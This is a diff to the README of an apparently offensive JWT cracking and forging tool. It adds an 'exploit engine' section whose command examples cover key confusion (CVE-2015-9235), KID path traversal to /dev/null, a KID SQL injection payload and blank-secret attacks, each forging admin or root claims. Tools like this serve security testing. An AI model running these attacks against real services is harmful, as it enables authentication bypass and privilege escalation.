@@ -14,6 +14,7 @@ zero external dependencies beyond `rich` for terminal formatting. built using st
 - **crack**: multi-threaded wordlist attack against hs256, hs384, and hs512 tokens with live throughput stats
 - **forge**: generate new tokens or alter existing claims (e.g. modify role or extend expiration) once the secret is known or with `alg:none`
 - **asp.net core support**: audit and normalize Microsoft XML schema claims (`schemas.microsoft.com/ws/2008/06/identity/claims/role`), detect claim confusion vulnerabilities, and forge ASP.NET Core compatible tokens (`--aspnet`)
+- **cve exploit engine**: forge tokens via RS256->HS256 Key Confusion (CVE-2015-9235), KID path traversal (`/dev/null` empty secret attack), KID SQL injection, and blank secret attacks
 - **zero dependencies**: pure python stdlib implementation (`hmac`, `hashlib`, `base64`, `concurrent.futures`)
 
 ## installation
@@ -72,7 +73,22 @@ jwtcrack aspnet <token>
 jwtcrack forge <token> --secret "mysecret" --claims '{"role":"Administrator"}' --aspnet
 ```
 
-### 7. interactive mode
+### 7. exploit engine (cve & header bypasses)
+```bash
+# rs256 -> hs256 key confusion attack using public key
+jwtcrack exploit <token> --attack key-confusion --public-key pubkey.pem --claims '{"role":"admin"}'
+
+# kid /dev/null empty secret attack
+jwtcrack exploit <token> --attack devnull --claims '{"role":"root"}'
+
+# kid sql injection bypass
+jwtcrack exploit <token> --attack sqli --kid "key' UNION SELECT 'mysecret' -- -" --secret "mysecret"
+
+# blank secret attack
+jwtcrack exploit <token> --attack blank --claims '{"role":"admin"}'
+```
+
+### 8. interactive mode
 run without arguments to launch the interactive prompt:
 ```bash
 jwtcrack
